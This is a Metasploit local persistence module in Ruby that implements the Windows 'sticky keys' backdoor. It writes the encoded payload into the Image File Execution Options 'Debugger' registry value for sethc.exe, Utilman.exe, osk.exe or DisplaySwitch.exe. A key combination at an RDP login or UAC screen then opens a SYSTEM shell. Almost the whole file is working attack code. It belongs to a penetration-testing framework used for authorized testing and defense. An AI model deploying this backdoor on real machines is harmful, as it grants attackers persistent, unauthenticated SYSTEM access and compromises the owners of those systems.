##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking
  include Msf::Post::File
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Priv
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Local::Persistence
  include Msf::Exploit::Deprecated
  moved_from 'post/windows/manage/sticky_keys'

  DEBUG_REG_PATH = 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options'
  DEBUG_REG_VALUE = 'Debugger'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Sticky Keys Persistence Module',
        'Description' => %q{
          This module makes it possible to apply the 'sticky keys' hack to a session with appropriate
          rights. The hack provides a means to get a SYSTEM shell using UI-level interaction at an RDP
          login screen or via a UAC confirmation dialog. The module modifies the Debug registry setting
          for certain executables.

          The module options allow for this hack to be applied to:

          SETHC   (sethc.exe is invoked when SHIFT is pressed 5 times),
          UTILMAN (Utilman.exe is invoked by pressing WINDOWS+U),
          OSK     (osk.exe is invoked by pressing WINDOWS+U, then launching the on-screen keyboard), and
          DISP    (DisplaySwitch.exe is invoked by pressing WINDOWS+P).
        },
        'Author' => ['OJ Reeves'],
        'Platform' => [ 'win' ],
        'SessionTypes' => ['meterpreter', 'shell'],
        # these are lies, but for compatibility
        'Arch' => ARCH_CMD,
        'Targets' => [ [ 'Automatic', {} ] ],
        'DefaultTarget' => 0,
        # end lies
        'DisclosureDate' => '1995-08-24', # released with Windows 95
        'References' => [
          ['URL', 'https://web.archive.org/web/20170201184448/https://social.technet.microsoft.com/Forums/windows/en-US/a3968ec9-5824-4bc2-82a2-a37ea88c273a/sticky-keys-exploit'],
          ['URL', 'https://blog.carnal0wnage.com/2012/04/privilege-escalation-via-sticky-keys.html'],
          ['URL', 'https://attack.mitre.org/techniques/T1546/008/']
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION, EVENT_DEPENDENT],
          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES]
        }
      )
    )

    register_options([
      # XXX add magnify.exe, narrator, atbroker? All listed in mitre attack
      OptEnum.new('BIN_TARGET', [true, 'The target binary to add the exploit to.', 'SETHC', ['SETHC', 'UTILMAN', 'OSK', 'DISP']]),
    ])

    deregister_options('WritableDir')
  end

  #
  # Returns the name of the executable to modify the debugger settings of.
  #
  def get_target_exe_name
    case datastore['BIN_TARGET']
    when 'UTILMAN'
      'Utilman.exe'
    when 'OSK'
      'osk.exe'
    when 'DISP'
      'DisplaySwitch.exe'
    else
      'sethc.exe'
    end
  end

  #
  # Returns the key combinations required to invoke the exploit once installed.
  #
  def get_target_key_combo
    case datastore['BIN_TARGET']
    when 'UTILMAN'
      'WINDOWS+U'
    when 'OSK'
      'WINDOWS+U, then launching the on-screen keyboard'
    when 'DISP'
      'WINDOWS+P'
    else
      'SHIFT 5 times'
    end
  end

  #
  # Returns the full path to the target's registry key based on the current target
  # settings.
  #
  def get_target_exe_reg_key
    "#{DEBUG_REG_PATH}\\#{get_target_exe_name}"
  end

  def check
    return CheckCode::Safe('This module requires admin privs to run') unless is_admin?

    CheckCode::Appears('Target is likely vulnerable')
  end

  #
  # Runs the exploit.
  #
  def install_persistence
    unless is_admin?
      fail_with(Failure::NoAccess, 'The current session does not have administrative rights.')
    end

    print_good('Session has administrative rights, proceeding.')

    target_key = get_target_exe_reg_key
    command = payload.encoded

    registry_createkey(target_key)
    registry_setvaldata(target_key, DEBUG_REG_VALUE, command, 'REG_SZ')

    print_good("'Sticky keys' successfully added. Launch the exploit at an RDP or UAC prompt by pressing #{get_target_key_combo}.")
    @clean_up_rc << "reg deletekey -k '#{target_key}'\n"
  end
end
